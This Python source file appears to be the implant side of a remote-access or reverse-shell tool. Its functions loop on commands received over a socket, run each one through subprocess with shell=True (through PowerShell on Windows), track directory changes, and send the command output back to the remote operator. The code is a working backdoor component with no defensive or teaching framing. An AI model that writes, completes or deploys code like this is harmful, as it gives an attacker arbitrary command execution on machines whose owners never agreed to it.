import subprocess,os,platform

def handleConnection(sock):
    print("[+] Handling connection")
    while True:
        userInput = sock.receiveData()
        print("[+] userInput:  ", userInput)
        if userInput == "exit":
            break
        elif userInput == "1":
            print("[+] Running system commands")
            # adding a function for execute os command
            execute_function(sock)
        else:
            print("[+] Invalid commands")

def execute_function(sock):
    windows = False
    print(platform.platform())
    if "Windows" in platform.platform():
        windows = True
    print("[+] Executing command")
    while True:
        userCommand = sock.receiveData()
        print(userCommand)
        if userCommand == "stop":
            break
        # output_command = subprocess.run(["powershell",userCommand], shell=True, capture_output=True)
        command = userCommand.split(" ")
        print(command)
        if command[0] == "cd":
            try:
                os.chdir(command[1])
                sock.sendData("\n")
                continue
            except:
                print("Something wrong with specified directory")
                sock.sendData("Path doesn't exist")
                os.chdir(os.getcwd())
                continue
        elif  command[0]=="powershell" and command[1] == "Set-Location":
            try:
                os.chdir(command[2])
                sock.sendData("\n")
                continue
            except:
                print("Something wrong with specified directory")
                sock.sendData("Path doesn't exist")
                os.chdir(os.getcwd())
                continue
        if not windows:
            output_command = subprocess.run(userCommand, shell=True, capture_output=True)
        else:
            output_command = subprocess.run(["powershell",userCommand], shell=True, capture_output=True)
        if output_command.stderr.decode("utf-8") == "":
            cmd_result = output_command.stdout.decode('utf-8')
        else:
            cmd_result = output_command.stderr.decode('utf-8')
        if len(cmd_result): 
            print(cmd_result)
            sock.sendData(cmd_result)
        else:
            sock.sendData("\n")
